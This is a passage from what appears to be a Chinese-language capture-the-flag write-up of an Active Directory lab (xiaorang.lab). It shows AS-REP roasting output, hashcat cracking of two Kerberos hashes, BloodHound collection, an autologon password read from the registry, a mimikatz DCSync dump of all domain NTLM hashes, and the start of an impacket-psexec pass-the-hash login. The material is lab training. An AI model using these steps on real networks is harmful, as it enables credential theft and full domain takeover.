Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weicheng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weishengshan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wenbiao doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User wenbo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wengbang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wenliang doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User wohua doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User xiqidi doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User xiyi doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User xuanjiang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yangju doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User yanglang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yexing doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yifu doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yuanchang doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User yulvxue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhaoxiu doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhenjun doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User zhufeng doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n~~~\n\n可以得到了两个用户的密码\n\n~~~\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa\n\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0\n\n~~~\n\n用hashcat爆破一下`└─# hashcat -m 18200 passhash  /usr/share/wordlists/rockyou.txt`\n\n~~~\n$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty\n$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry\n~~~\n\n`wenshao:hellokitty`、`zhangxin:strawberry`\n\n用bloodhound进行信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time2.png)\n\n借一张大佬的图，可以看到WIN2019.XIAORANG.LAB到YUXUAN@XIAORANG.LAB是有HasSession的，\n\nHasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time3.png)\n\n可以直接查看注册表\n\n~~~\n\nC:\\Users\\zhangxin\\Desktop>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    AutoRestartShell    REG_DWORD    0x1\n    Background    REG_SZ    0 0 0\n    CachedLogonsCount    REG_SZ    10\n    DebugServerCommand    REG_SZ    no\n    DisableBackButton    REG_DWORD    0x1\n    EnableSIHostIntegration    REG_DWORD    0x1\n    ForceUnlockLogon    REG_DWORD    0x0\n    LegalNoticeCaption    REG_SZ\n    LegalNoticeText    REG_SZ\n    PasswordExpiryWarning    REG_DWORD    0x5\n    PowerdownAfterShutdown    REG_SZ    0\n    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}\n    ReportBootOk    REG_SZ    1\n    Shell    REG_SZ    explorer.exe\n    ShellCritical    REG_DWORD    0x0\n    ShellInfrastructure    REG_SZ    sihost.exe\n    SiHostCritical    REG_DWORD    0x0\n    SiHostReadyTimeOut    REG_DWORD    0x0\n    SiHostRestartCountLimit    REG_DWORD    0x0\n    SiHostRestartTimeGap    REG_DWORD    0x0\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\n    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile\n    WinStationsDisabled    REG_SZ    0\n    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe\n    scremoveoption    REG_SZ    0\n    DisableCAD    REG_DWORD    0x1\n    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15\n    ShutdownFlags    REG_DWORD    0x80000027\n    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180\n    LastUsedUsername    REG_SZ    yuxuan\n    AutoAdminLogon    REG_SZ    1\n    DefaultUserName    REG_SZ    yuxuan\n    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L\n    DefaultDomainName    REG_SZ    xiaorang.lab\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShells\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaults\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonChecked\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey\n~~~\n\n~~~\n   DefaultUserName    REG_SZ    yuxuan\n    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L\n    DefaultDomainName    REG_SZ    xiaorang.lab\n~~~\n\nyuxuan用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限\n\n先登录yuxuan用户，然后用mimikatz抓取administrator的哈希\n\n~~~\nC:\\Users\\yuxuan\\Desktop>mimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512\n1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512\n1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512\n1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512\n1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512\n1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512\n1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512\n1111    wenbo   9abb7115997ea03785e92542f684bdde        512\n1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512\n1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512\n1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512\n1117    weicheng        796a774eace67c159a65d6b86fea1d01        512\n1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512\n1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512\n1120    jizhen  1840c5130e290816b55b4e5b60df10da        512\n1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512\n1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512\n1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512\n1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512\n1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512\n1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512\n1127    chouqian        c6f0585b35de1862f324bc33c920328d        512\n1128    jicheng 159ee55f1626f393de119946663a633c        512\n1129    xiyi    ee146df96b366efaeb5138832a75603b        512\n1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512\n1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512\n1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512\n1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512\n1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512\n1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512\n1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512\n1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512\n1138    gaijin  b1040198d43631279a63b7fbc4c403af        512\n1139    yifu    4836347be16e6af2cd746d3f934bb55a        512\n1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512\n1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512\n1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512\n1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512\n1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512\n1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512\n1147    lili    b290a36500f7e39beee8a29851a9f8d5        512\n1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512\n1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512\n1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512\n1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512\n1152    langying        52a8a125cd369ab16a385f3fcadc757d        512\n1153    diaocai a14954d5307d74cd75089514ccca097a        512\n1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512\n1155    manxue  0255c42d9f960475f5ad03e0fee88589        512\n1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512\n1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512\n1158    louyou  a97ba112b411a3bfe140c941528a4648        512\n1159    maqun   485c35105375e0754a852cee996ed33b        512\n1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512\n1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512\n1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512\n1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512\n1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512\n1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512\n1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512\n1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512\n1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512\n1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512\n1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512\n1172    dujian  8f7846c78f03bf55685a697fe20b0857        512\n1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512\n1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512\n1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512\n1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512\n1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512\n502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514\n500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512\n1000    DC-PROGAME$     b1f83a8f5daf6f7825f6a69d98c8f364        532480\n1180    yuxuan  376ece347142d1628632d440530e8eed        66048\n1181    WIN2019$        5447da4f138ae51f887cf24e79a9eba3        4096\n1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352\n1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352\n\nmimikatz(commandline) # exit\nBye!\n~~~\n\n有了administrator的密码了，就相当于控制域控了，登录一下其他的机器type flag就行了\n\n# FLAG3、4\n\nflag03在172.22.6.25的C:\\Users\\Administrator\\flag\\下\n\nflag04在172.22.6.12的C:\\Users\\Administrator\\flag\\下\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.12  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its 